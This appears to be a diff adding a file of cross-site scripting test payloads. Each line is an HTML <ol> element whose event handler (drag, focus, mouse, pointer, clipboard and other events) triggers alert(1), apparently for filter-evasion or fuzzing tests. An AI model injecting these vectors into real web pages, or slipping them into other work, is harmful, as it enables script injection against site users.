@@ -1,0 +1,43 @@
+<ol draggable="true" ondrag="alert(1)">test</ol>
+<ol draggable="true" ondragend="alert(1)">test</ol>
+<ol draggable="true" ondragenter="alert(1)">test</ol>
+<ol draggable="true" ondragleave="alert(1)">test</ol>
+<ol draggable="true" ondragstart="alert(1)">test</ol>
+<ol id=x tabindex=1 onactivate=alert(1)></ol>
+<ol id=x tabindex=1 onbeforeactivate=alert(1)></ol>
+<ol id=x tabindex=1 onbeforedeactivate=alert(1)></ol><input autofocus>
+<ol id=x tabindex=1 ondeactivate=alert(1)></ol><input id=y autofocus>
+<ol id=x tabindex=1 onfocus=alert(1)></ol>
+<ol id=x tabindex=1 onfocusin=alert(1)></ol>
+<ol onafterscriptexecute=alert(1)><script>1</script>
+<ol onbeforecopy="alert(1)" contenteditable>test</ol>
+<ol onbeforecut="alert(1)" contenteditable>test</ol>
+<ol onbeforepaste="alert(1)" contenteditable>test</ol>
+<ol onbeforescriptexecute=alert(1)><script>1</script>
+<ol onblur=alert(1) tabindex=1 id=x></ol><input autofocus>
+<ol onclick="alert(1)">test</ol>
+<ol oncontextmenu="alert(1)">test</ol>
+<ol oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<ol oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<ol ondblclick="alert(1)" autofocus tabindex=1>test</ol>
+<ol onfocusout=alert(1) tabindex=1 id=x></ol><input autofocus>
+<ol onkeydown="alert(1)" contenteditable>test</ol>
+<ol onkeypress="alert(1)" contenteditable>test</ol>
+<ol onkeyup="alert(1)" contenteditable>test</ol>
+<ol onmousedown="alert(1)">test</ol>
+<ol onmouseenter="alert(1)">test</ol>
+<ol onmouseleave="alert(1)">test</ol>
+<ol onmousemove="alert(1)">test</ol>
+<ol onmouseout="alert(1)">test</ol>
+<ol onmouseover="alert(1)">test</ol>
+<ol onmouseup="alert(1)">test</ol>
+<ol onmousewheel=alert(1)>requires scrolling
+<ol onpaste="alert(1)" contenteditable>test</ol>
+<ol onpointerdown=alert(1)>XSS</ol>
+<ol onpointerenter=alert(1)>XSS</ol>
+<ol onpointerleave=alert(1)>XSS</ol>
+<ol onpointermove=alert(1)>XSS</ol>
+<ol onpointerout=alert(1)>XSS</ol>
+<ol onpointerover=alert(1)>XSS</ol>
+<ol onpointerrawupdate=alert(1)>XSS</ol>
+<ol onpointerup=alert(1)>XSS</ol>
